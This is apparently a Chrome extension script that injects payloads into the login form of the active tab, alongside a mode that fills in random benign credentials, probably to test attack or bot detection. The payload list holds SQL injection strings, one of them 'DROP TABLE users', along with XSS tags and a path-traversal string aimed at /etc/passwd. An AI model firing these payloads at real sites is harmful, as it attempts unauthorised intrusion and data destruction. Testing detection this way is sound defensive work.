const payloads = [
  { u: "admin' --", p: "password123" },
  { u: "admin", p: "' OR '1'='1" },
  { u: "<script>alert('XSS')</script>", p: "test" },
  { u: "admin", p: "'; DROP TABLE users; --" },
  { u: "../../../../etc/passwd", p: "file_access" },
  { u: "<img src=x onerror=alert(1)>", p: "xss_img" },
  { u: "admin", p: "admin' AND 1=1#" },
  { u: "') OR 1=1 LIMIT 1--", p: "blind_sql" }
];

document.getElementById('runBot').addEventListener('click', async () => {
  let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });

  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    args: [payloads], // On passe les payloads à la fonction
    function: (attackList) => {
      // Sélecteurs flexibles pour supporter les différentes versions du formulaire
      const userField = document.querySelector('#username_input input, #f-user, input[formControlName="identifier"], input[name="username"]');
      const passField = document.querySelector('#password_input input, #f-pass, input[formControlName="password"], input[name="password"]');
      const loginBtn = document.querySelector('#login_btn, #login-submit-btn, .auth-submit, button[type="submit"]');

      if (userField && passField && loginBtn) {
        // Choix d'une attaque aléatoire
        const attack = attackList[Math.floor(Math.random() * attackList.length)];
        
        userField.value = attack.u;
        passField.value = attack.p;

        // Déclencher les événements pour Angular/React
        userField.dispatchEvent(new Event('input', { bubbles: true }));
        passField.dispatchEvent(new Event('input', { bubbles: true }));
        userField.dispatchEvent(new Event('change', { bubbles: true }));
        passField.dispatchEvent(new Event('change', { bubbles: true }));

        setTimeout(() => {
          loginBtn.click();
          console.log("Attaque lancée : ", attack);
        }, 100);
      } else {
        console.error("Champs manquants:", { userField, passField, loginBtn });
        alert("Champs de connexion non trouvés (Username: " + !!userField + ", Password: " + !!passField + ", Button: " + !!loginBtn + ")");
      }
    }
  });
});

document.getElementById('runHuman').addEventListener('click', async () => {
  let [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  chrome.scripting.executeScript({
    target: { tabId: tab.id },
    function: () => {
      const userField = document.querySelector('#username_input input, #f-user, input[formControlName="identifier"], input[name="username"]');
      const passField = document.querySelector('#password_input input, #f-pass, input[formControlName="password"], input[name="password"]');
      const loginBtn = document.querySelector('#login_btn, #login-submit-btn, .auth-submit, button[type="submit"]');

      if (userField && passField && loginBtn) {
        userField.focus();
        userField.value = "human_user_" + Math.floor(Math.random()*100);
        userField.dispatchEvent(new Event('input', { bubbles: true }));
        userField.dispatchEvent(new Event('change', { bubbles: true }));
        userField.dispatchEvent(new Event('paste', { bubbles: true }));
        setTimeout(() => {
          passField.focus();
          passField.value = "SecurePass!" + Math.floor(Math.random()*1000);
          passField.dispatchEvent(new Event('input', { bubbles: true }));
          passField.dispatchEvent(new Event('change', { bubbles: true }));
          passField.dispatchEvent(new Event('paste', { bubbles: true }));
          setTimeout(() => loginBtn.click(), 1200);
        }, 500);
      } else {
        alert("Champs de connexion non trouvés.");
      }
    }
  });
});
